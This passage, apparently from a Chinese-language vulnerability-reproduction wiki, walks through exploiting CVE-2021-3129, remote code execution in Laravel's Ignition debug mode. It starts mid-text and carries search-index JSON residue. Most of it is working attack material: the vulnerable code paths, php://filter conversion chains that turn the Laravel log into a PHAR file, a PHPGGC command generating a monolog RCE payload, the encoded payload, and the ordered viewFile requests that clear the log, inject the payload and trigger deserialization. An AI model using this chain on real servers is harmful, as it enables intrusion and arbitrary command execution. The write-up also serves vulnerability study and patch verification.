getRunnableSolution (); $solution -> run ( $request -> get ( 'parameters' , [])); return response ( '' ); } } \u63a5\u7740\u8c03\u7528solution\u5bf9\u8c61\u4e2d\u7684 run() \u65b9\u6cd5\uff0c\u5e76\u5c06\u53ef\u63a7\u7684 parameters \u53c2\u6570\u4f20\u8fc7\u53bb\u3002\u901a\u8fc7\u8fd9\u4e2a\u70b9\u6211\u4eec\u53ef\u4ee5\u8c03\u7528\u5230 MakeViewVariableOptionalSolution::run() <?php namespace Facade\\Ignition\\Solutions ; use Facade\\IgnitionContracts\\RunnableSolution ; use Illuminate\\Support\\Facades\\Blade ; class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run ( array $parameters = []) { $output = $this -> makeOptional ( $parameters ); if ( $output !== false ) { file_put_contents ( $parameters [ 'viewFile' ], $output ); } } public function makeOptional ( array $parameters = []) { $originalContents = file_get_contents ( $parameters [ 'viewFile' ]); $newContents = str_replace ( '$' . $parameters [ 'variableName' ], '$' . $parameters [ 'variableName' ] . \" ?? ''\" , $originalContents ); $originalTokens = token_get_all ( Blade :: compileString ( $originalContents )); $newTokens = token_get_all ( Blade :: compileString ( $newContents )); $expectedTokens = $this -> generateExpectedTokens ( $originalTokens , $parameters [ 'variableName' ]); if ( $expectedTokens !== $newTokens ) { return false ; } return $newContents ; } protected function generateExpectedTokens ( array $originalTokens , string $variableName ) : array { $expectedTokens = []; foreach ( $originalTokens as $token ) { $expectedTokens [] = $token ; if ( $token [ 0 ] === T_VARIABLE && $token [ 1 ] === '$' . $variableName ) { $expectedTokens [] = [ T_WHITESPACE , ' ' , $token [ 2 ]]; $expectedTokens [] = [ T_COALESCE , '??' , $token [ 2 ]]; $expectedTokens [] = [ T_WHITESPACE , ' ' , $token [ 2 ]]; $expectedTokens [] = [ T_CONSTANT_ENCAPSED_STRING , \"''\" , $token [ 2 ]]; } } return $expectedTokens ; } } \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u4e3b\u8981\u529f\u80fd\u70b9\u662f\uff1a\u8bfb\u53d6\u4e00\u4e2a\u7ed9\u5b9a\u7684\u8def\u5f84\uff0c\u5e76\u66ff\u6362 $variableName \u4e3a $variableName ?? '' \uff0c\u4e4b\u540e\u5199\u56de\u6587\u4ef6\u4e2d\u3002\u7531\u4e8e\u8fd9\u91cc\u8c03\u7528\u4e86 file_get_contents() \uff0c\u4e14\u5176\u4e2d\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u901a\u8fc7 phar:// \u534f\u8bae\u53bb\u89e6\u53d1phar\u53cd\u5e8f\u5217\u5316\u3002\u5982\u679c\u540e\u671f\u5229\u7528\u6846\u67b6\u8fdb\u884c\u5f00\u53d1\u7684\u4eba\u5458\uff0c\u5199\u51fa\u4e86\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u7684\u529f\u80fd\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a\u6076\u610fphar\u6587\u4ef6\uff0c\u5229\u7528\u4e0a\u8ff0\u7684 file_get_contents() \u53bb\u89e6\u53d1phar\u53cd\u5e8f\u5217\u5316\uff0c\u8fbe\u5230rce\u7684\u6548\u679c\u3002 \u9664\u4e86\u89e3\u51b3\u65b9\u6848\u7684\u7c7b\u540d\u4e4b\u5916\uff0c\u8fd8\u53d1\u9001\u4e86\u4e00\u4e2a\u6587\u4ef6\u8def\u5f84\u548c\u4e00\u4e2a\u6211\u4eec\u8981\u66ff\u6362\u7684\u53d8\u91cf\u540d\u3002\u8fd9\u770b\u8d77\u6765\u975e\u5e38\u8ba9\u4eba\u611f\u5174\u8da3\u3002 \u8ba9\u6211\u4eec\u5148\u68c0\u67e5\u4e00\u4e0b\u7c7b\u540d\u7684\u5229\u7528\u65b9\u6cd5\uff1a\u6211\u4eec\u53ef\u4ee5\u5b9e\u4f8b\u5316\u4efb\u610f\u7684\u7c7b\u5417\uff1f class SolutionProviderRepository implements SolutionProviderRepositoryContract { ... public function getSolutionForClass(string $solutionClass): ?Solution { if (! class_exists($solutionClass)) { return null; } if (! in_array(Solution::class, class_implements($solutionClass))) { return null; } return app($solutionClass); } } \u7b54\u6848\u662f\u5426\u5b9a\u7684\uff1aIgnition\u603b\u662f\u7528\u6211\u4eec\u6307\u5411\u7684\u7c7b\u6765\u5b9e\u73b0**RunnableSolution** \u90a3\u4e48\uff0c\u8ba9\u6211\u4eec\u4ed4\u7ec6\u770b\u770b\u8fd9\u4e2a\u7c7b\u3002\u5b9e\u9645\u4e0a\uff0c\u8d1f\u8d23\u8be5\u64cd\u4f5c\u7684\u4ee3\u7801\u4f4d**./vendor/facade/ignition/sr/solutions/MakeViewVariableOptionalSolution.php**\u6587\u4ef6\u4e2d\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u66f4\u6539\u4efb\u610f\u6587\u4ef6\u7684\u5185\u5bb9\u4e48\uff1f class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this->makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); // [1] $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } ... } \u8fd9\u6bb5\u4ee3\u7801\u6bd4\u6211\u4eec\u9884\u60f3\u7684\u8981\u590d\u6742\u4e00\u4e9b\uff1a\u5b83\u4f1a\u5728\u8bfb\u53d6\u7ed9\u5b9a\u7684\u6587\u4ef6\u8def\u5f84[1]\u540e\uff0c\u5c06 variableName\u66ff\u6362\u4e3a variableName\u66ff\u6362\u4e3a variableName ?? ''\uff0c\u521d\u59cb\u6587\u4ef6\u548c\u65b0\u6587\u4ef6\u90fd\u5c06\u88ab\u6807\u8bb0\u5316[2]\u3002\u5982\u679c\u6211\u4eec\u7684\u4ee3\u7801\u7ed3\u6784\u6ca1\u6709\u53d1\u751f\u8d85\u51fa\u9884\u671f\u7684\u53d8\u5316\uff0c\u6587\u4ef6\u5c06\u88ab\u66ff\u6362\u4e3a\u65b0\u7684\u5185\u5bb9\u3002\u5426\u5219\uff0cmakeOptional\u5c06\u8fd4\u56defalse[3]\uff0c\u65b0\u6587\u4ef6\u5c06\u4e0d\u4f1a\u88ab\u5199\u5165\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u65e0\u6cd5\u4f7f\u7528variableName\u505a\u592a\u591a\u4e8b\u60c5\u3002 \u5269\u4e0b\u7684\u552f\u4e00\u8f93\u5165\u53d8\u91cf\u5c31\u662fviewFile\u3002\u5982\u679c\u6211\u4eec\u5bf9variableName\u548c\u5b83\u7684\u6240\u6709\u7528\u6cd5\u8fdb\u884c\u62bd\u8c61\uff0c\u6211\u4eec\u6700\u7ec8\u4f1a\u5f97\u5230\u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5\uff1a $contents =file_get_contents($parameters['viewFile']); file_put_contents($parameters['viewFile'], $contents); \u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u5927\u5bb6\u53ef\u80fd\u90fd\u542c\u8bf4\u8fc7Orange Tsai\u6f14\u793a\u7684\u4e0a\u4f20\u8fdb\u5ea6\u6280\u672f\u3002\u8be5\u6280\u672f\u5229\u7528php://filter\u5728\u8fd4\u56de\u6587\u4ef6\u4e4b\u524d\u4fee\u6539\u5176\u5185\u5bb9\u3002\u501f\u52a9\u4e8e\u8be5\u6280\u672f\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u6f0f\u6d1e\u5229\u7528\u539f\u8bed\u6765\u8f6c\u6362\u6587\u4ef6\u7684\u5185\u5bb9 $ echo test | base64 | base64 > /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K $f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt' ; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents ( $f ) ; # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents ( $f , $contents ) ; $ cat /path/to/file.txt test \u6211\u4eec\u5df2\u7ecf\u6539\u53d8\u4e86\u6587\u4ef6\u7684\u5185\u5bb9\uff01\u9057\u61be\u7684\u662f\uff0c\u8fd9\u5c06\u4f1a\u5e94\u7528\u4e24\u6b21\u8f6c\u6362\u3002\u9605\u8bfb\u6587\u6863\u540e\uff0c\u6211\u4eec\u627e\u5230\u4e86\u53ea\u8fdb\u884c\u4e00\u6b21\u8f6c\u6362\u7684\u65b9\u6cd5\uff1a # To base64-decode once, use: $f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt' ; # OR $f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt' ; \u574f\u5b57\u7b26\u751a\u81f3\u90fd\u4f1a\u88ab\u5ffd\u7565\uff1a $ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt $f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt' ; $contents = file_get_contents ( $f ) ; file_put_contents ( $f , $contents ) ; $ cat /path/to/file.txt test \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cLaravel\u7684\u65e5\u5fd7\u6587\u4ef6\uff08\u5b58\u653ePHP\u9519\u8bef\u548c\u5806\u6808\u8ddf\u8e2a\uff09\u662f\u5b58\u50a8\u5728storage/log/laravel.log\u4e2d\u7684\u3002\u4e0b\u9762\uff0c\u8ba9\u6211\u4eec\u901a\u8fc7\u5c1d\u8bd5\u52a0\u8f7d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u6765\u751f\u6210\u4e00\u4e2a\u9519\u8bef, \u5373SOME_TEXT_OF_OUR_CHOICE\uff1a [ 2021 -01-11 12 :39:44 ] local.ERROR: file_get_contents ( SOME_TEXT_OF_OUR_CHOICE ) : failed to open stream: No such file or directory { \"exception\" : \"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions->handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController->__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline->Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline->then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel->sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel->handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \" } \u6211\u4eec\u53ef\u4ee5\u5411\u6587\u4ef6\u4e2d\u6ce8\u5165\uff08\u51e0\u4e4e\uff09\u4efb\u610f\u7684\u5185\u5bb9\u4e86\u3002\u7406\u8bba\u4e0a\u8bb2\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528Orange\u53d1\u660e\u7684\u6280\u672f\u5c06\u65e5\u5fd7\u6587\u4ef6\u8f6c\u6362\u4e3a\u6709\u6548\u7684PHAR\u6587\u4ef6\uff0c\u7136\u540e\uff0c\u4f7f\u7528phar://\u5305\u88c5\u5668\u6765\u8fd0\u884c\u5e8f\u5217\u5316\u7684\u4ee3\u7801\u3002\u9057\u61be\u7684\u662f\uff0c\u8fd9\u5b9e\u9645\u4e0a\u662f\u884c\u4e0d\u901a\u7684\uff0c\u5e76\u4e14\u539f\u56e0\u6709\u5f88\u591a\u3002 \u6211\u4eec\u5728\u524d\u9762\u8bf4\u8fc7\uff0c\u5f53\u5bf9\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fdb\u884cba se64-decoding\u5904\u7406\u65f6\uff0cPHP\u4f1a\u5ffd\u7565\u4efb\u4f55\u574f\u5b57\u7b26\u3002\u8fd9\u901a\u5e38\u662f\u6b63\u786e\u7684\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u5b57\u7b26\u9664\u5916\uff0c\u5373=\u3002\u5982\u679c\u4f60\u4f7f\u7528ba se64-decode\u8fc7\u6ee4\u4e00\u4e2a\u4e2d\u95f4\u542b\u6709\u5b57\u7b26=\u7684\u5b57\u7b26\u4e32\uff0cPHP\u5c06\u4ea7\u751f\u4e00\u4e2a\u9519\u8bef\uff0c\u5e76\u4e14\u4e0d\u4f1a\u8fd4\u56de\u4efb\u4f55\u5185\u5bb9\u3002 \u5982\u679c\u6211\u4eec\u80fd\u63a7\u5236\u6574\u4e2a\u6587\u4ef6\uff0c\u90a3\u5c31\u597d\u4e86\u3002\u7136\u800c\uff0c\u6211\u4eec\u6ce8\u5165\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\u6587\u672c\u53ea\u662f\u5176\u4e2d\u5f88\u5c0f\u7684\u4e00\u90e8\u5206\u3002\u5b83\u4e0d\u4ec5\u6709\u4e00\u4e2a\u4e0d\u7b97\u5f88\u5927\u7684\u524d\u7f00\uff08\u65e5\u671f\uff09\uff0c\u8fd8\u6709\u4e00\u4e2a\u81c3\u80bf\u7684\u540e\u7f00\uff08\u5806\u6808\u8ddf\u8e2a\uff09\u3002\u6b64\u5916\uff0c\u6211\u4eec\u6ce8\u5165\u7684\u6587\u672c\u8fd8\u51fa\u73b0\u4e86\u4e24\u6b21\uff01 \u4e0b\u9762\u662f\u53e6\u4e00\u4ef6\u53ef\u6015\u7684\u4e8b\u60c5\uff1a php > var_dump(base64_decode(base64_decode('[2022-04-3023:59:11]'))); string(0) \"\" php >var_dump(base64_decode(base64_decode('[2022-04-12 23:59:11]'))); string(1) \"2\" \u6839\u636e\u65e5\u671f\u7684\u4e0d\u540c\uff0c\u5bf9\u524d\u7f00\u8fdb\u884c\u4e24\u6b21\u89e3\u7801\u65f6\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u5927\u5c0f\u7684\u7ed3\u679c\u3002\u5f53\u6211\u4eec\u5bf9\u5b83\u8fdb\u884c\u7b2c\u4e09\u6b21\u89e3\u7801\u65f6\uff0c\u5728\u7b2c\u4e8c\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u7684payload\u5c06\u4ee52\u4f5c\u4e3a\u524d\u7f00\uff0c\u4ece\u800c\u9700\u8981\u6539\u53d8base64\u6d88\u606f\u7684\u5bf9\u9f50\u65b9\u5f0f\u3002 \u4e3a\u4e86\u4f7f\u5176\u6b63\u5e38\u8fd0\u884c\uff0c\u6211\u4eec\u5fc5\u987b\u4e3a\u6bcf\u4e2a\u76ee\u6807\u5efa\u7acb\u4e00\u4e2a\u65b0\u7684payload\uff0c\u56e0\u4e3a\u5806\u6808\u8ddf\u8e2a\u4e2d\u5305\u542b\u7edd\u5bf9\u6587\u4ef6\u540d\uff1b\u5e76\u4e14\uff0c\u6bcf\u79d2\u90fd\u9700\u8981\u5efa\u7acb\u4e00\u4e2a\u65b0\u7684payload\uff0c\u56e0\u4e3a\u524d\u7f00\u4e2d\u5305\u542b\u65f6\u95f4\u3002\u5e76\u4e14\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u5b57\u7b26=\u9700\u8981\u8fdb\u884cbase64-decode\u5904\u7406\uff0c\u4ecd\u7136\u4f1a\u9762\u4e34\u5931\u8d25\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u56de\u5230PHP\u6587\u6863\u4e2d\u5bfb\u627e\u5176\u4ed6\u7c7b\u578b\u7684\u8fc7\u6ee4\u5668\u3002 [previous log entries] [prefix]PAYLOAD[midfix]PAYLOAD[suffix] \u9057\u61be\u7684\u662f\uff0c\u6211\u4eec\u5df2\u7ecf\u4e86\u89e3\u5230\uff0c\u5982\u679c\u6ee5\u7528base64-decode\u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5728\u67d0\u4e2a\u65f6\u5019\u5931\u8d25\u3002\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u6765\u5229\u7528\u8fd9\u4e00\u70b9\uff1a\u5982\u679c\u6211\u4eec\u6ee5\u7528\u5b83\uff0c\u5c06\u53d1\u751f\u89e3\u7801\u9519\u8bef\uff0c\u65e5\u5fd7\u6587\u4ef6\u5c06\u88ab\u6e05\u9664\uff01\u8fd9\u6837\uff0c\u6211\u4eec\u89e6\u53d1\u7684\u4e0b\u4e00\u4e2a\u9519\u8bef\u5c06\u5355\u72ec\u5b58\u5728\u4e8e\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff1a [prefix]PAYLOAD[midfix]PAYLOAD[suffix] \u73b0\u5728\uff0c\u6211\u4eec\u53c8\u56de\u5230\u4e86\u6700\u521d\u7684\u95ee\u9898\u4e0a\uff1a\u4fdd\u7559\u4e00\u4e2apayload\u5e76\u5220\u9664\u5176\u4f59\u7684\u3002\u5e78\u8fd0\u7684\u662f\uff0cphp://filter\u5e76\u4e0d\u9650\u4e8ebase64\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5b83\u6765\u8f6c\u6362\u5b57\u7b26\u96c6\uff0c\u4e0b\u9762\u662f\u4eceUTF-16\u5230UTF-8\u7684\u8f6c\u6362\uff1a echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); \u535b\u6d6f\u2065\u7270\u6665\u7869\u5d20PAYLOAD\u6d5b\u6469\u6966\u5d78PAYLOAD\u535b\u6d6f\u2065\u7573\u6666\u7869\u5d20 \u6211\u4eec\u7684payload\u8fd8\u5728\u90a3\u91cc\uff0c\u5b89\u5168\u65e0\u6059\uff0c\u53ea\u662f\u524d\u7f00\u548c\u540e\u7f00\u53d8\u6210\u4e86\u975eASCII\u5b57\u7b26\u3002\u7136\u800c\uff0c\u5728\u65e5\u5fd7\u6761\u76ee\u4e2d\uff0c\u6211\u4eec\u7684payload\u51fa\u73b0\u4e86\u4e24\u6b21\uff0c\u800c\u4e0d\u662f\u4e00\u6b21\u3002\u6211\u4eec\u9700\u8981\u53bb\u6389\u7b2c\u4e8c\u4e2a\u3002 \u7531\u4e8e\u6bcf\u4e2aUTF-16\u5b57\u7b26\u5360\u7528\u4e24\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728PAYLOAD\u7684\u7b2c\u4e8c\u4e2a\u5b9e\u4f8b\u7684\u672b\u5c3e\u589e\u52a0\u4e00\u4e2a\u5b57\u8282\uff0c\u6765\u4f7f\u5176\u65e0\u6cd5\u5bf9\u9f50\uff1a echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents ( 'php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt' ) ; \u535b\u6d6f\u2065\u7270\u6665\u7869\u5d20PAYLOAD\u5b58\u696d\u6664\u7869\u505d\u4100\u5900\u4c00\u4f00\u4100\u4400\u5800\u535b\u6d6f\u2065\u7573\u6666\u7869\u5d20 \u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\uff0c\u524d\u7f00\u7684\u5bf9\u9f50\u65b9\u5f0f\u4e0d\u518d\u91cd\u8981\uff1a\u5982\u679c\u524d\u7f00\u5927\u5c0f\u76f8\u7b49\uff0c\u7b2c\u4e00\u4e2apayload\u5c06\u88ab\u6b63\u786e\u89e3\u7801\uff1b\u5426\u5219\u7684\u8bdd\uff0c\u7b2c\u4e8c\u4e2apayload\u5c31\u4f1a\u88ab\u6b63\u786e\u89e3\u7801\u3002 \u5982\u679c\u5c06\u4e0a\u9762\u7684\u53d1\u73b0\u4e0e\u524d\u9762\u7684base64-decoding\u7ed3\u5408\u8d77\u6765\uff0c\u5c31\u80fd\u591f\u5bf9\u6211\u4eec\u60f3\u8981\u7684\u4efb\u4f55\u4e1c\u897f\u8fdb\u884c\u7f16\u7801\uff1a $ echo -n TEST! | base64 | sed -E 's/./\\0\\\\0/g' V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0 $ echo -ne '[Some prefix ]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[midfix]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt'); TEST! \u8bf4\u5230\u5bf9\u9f50\uff0c\u5982\u679c\u65e5\u5fd7\u6587\u4ef6\u672c\u8eab\u4e0d\u662f2\u5b57\u8282\u5bf9\u9f50\u7684\uff0c\u8f6c\u6362\u8fc7\u6ee4\u5668\u5c06\u5982\u4f55\u5904\u7406\uff1f PHP Warning: file_get_contents(): iconv stream filter(\"utf16le\"=>\"utf-8\"): invalid multibyte sequence in phpshell code on line 1 \u8fd9\u53c8\u662f\u4e00\u4e2a\u95ee\u9898\u3002\u4e0d\u8fc7\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u4e24\u4e2apayload\u6765\u8f7b\u677e\u5730\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a\u4e00\u4e2a\u662f\u65e0\u5bb3\u7684payload A\uff0c\u53e6\u4e00\u4e2a\u662f\u5177\u6709\u653b\u51fb\u6027\u7684payload B\uff0c\u5177\u4f53\u5982\u4e0b\u6240\u793a\uff1a [prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix] [prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix] \u7531\u4e8e\u8fd9\u91cc\u524d\u7f00\u3001\u4e2d\u7f00\u548c\u540e\u7f00\u90fd\u5b58\u5728\u4e24\u4efd\uff0c\u8fd8\u63d0\u4f9b\u4e86payload_a\u548cpayload_b\uff0c\u6240\u4ee5\uff0c\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\u5fc5\u7136\u662f\u5076\u6570\uff0c\u4ece\u800c\u907f\u514d\u4e86\u9519\u8bef\u7684\u53d1\u751f\u3002 \u6700\u540e\uff0c\u6211\u4eec\u8fd8\u8981\u89e3\u51b3\u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6211\u4eec\u4f7f\u7528NULL\u5b57\u8282\u5c06payload\u7684\u5b57\u8282\u4ece\u4e00\u4e2a\u586b\u5145\u4e3a\u4e24\u4e2a\u3002\u5728PHP\u4e2d\u8bd5\u56fe\u52a0\u8f7d\u4e00\u4e2a\u5e26\u6709NULL\u5b57\u8282\u7684\u6587\u4ef6\u65f6\uff0c\u4f1a\u751f\u6210\u4ee5\u4e0b\u9519\u8bef\uff1a PHP Warning: file_get_contents() expects parameter 1 to be a valid path, string givenin php shell code on line 1 \u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u65e0\u6cd5\u5728\u9519\u8bef\u65e5\u5fd7\u4e2d\u6ce8\u5165\u5e26\u6709NULL\u5b57\u8282\u7684payload\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6700\u540e\u4e00\u4e2a\u8fc7\u6ee4\u5668\u53ef\u4ee5\u5e2e\u5230\u6211\u4eec\uff0c\u5b83\u5c31\u662fconvert.quoted-printable-decode\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528=00\u5bf9NULL\u5b57\u8282\u8fdb\u884c\u7f16\u7801\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Laravel/Laravel%20%E5%B0%8F%E4%BA%8E%208.4.2%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129/#\u4e0b\u9762\u662f\u6211\u4eec\u6700\u7ec8\u7684\u8f6c\u6362\u94fe","text":"viewFile:php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.ba se64-decode/resource=/path/to/storage/logs/laravel.log \u521b\u5efa\u4e00\u4e2aPHPGGC payload\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u7f16\u7801\uff1a php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\\0=00/g' U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 \u6e05\u7a7a\u65e5\u5fd7 viewFile: php://filter/write = convert.base64-decode | convert.base64-decode | convert.base64-decode/resource = /path/to/storage/logs/laravel.log \u521b\u5efa\u7b2c\u4e00\u4e2a\u65e5\u5fd7\u6761\u76ee\uff0c\u7528\u4e8e\u5bf9\u9f50\uff1a viewFile: AA \u521b\u5efa\u5e26\u6709payload\u65e5\u5fd7\u6761\u76ee\uff1a viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 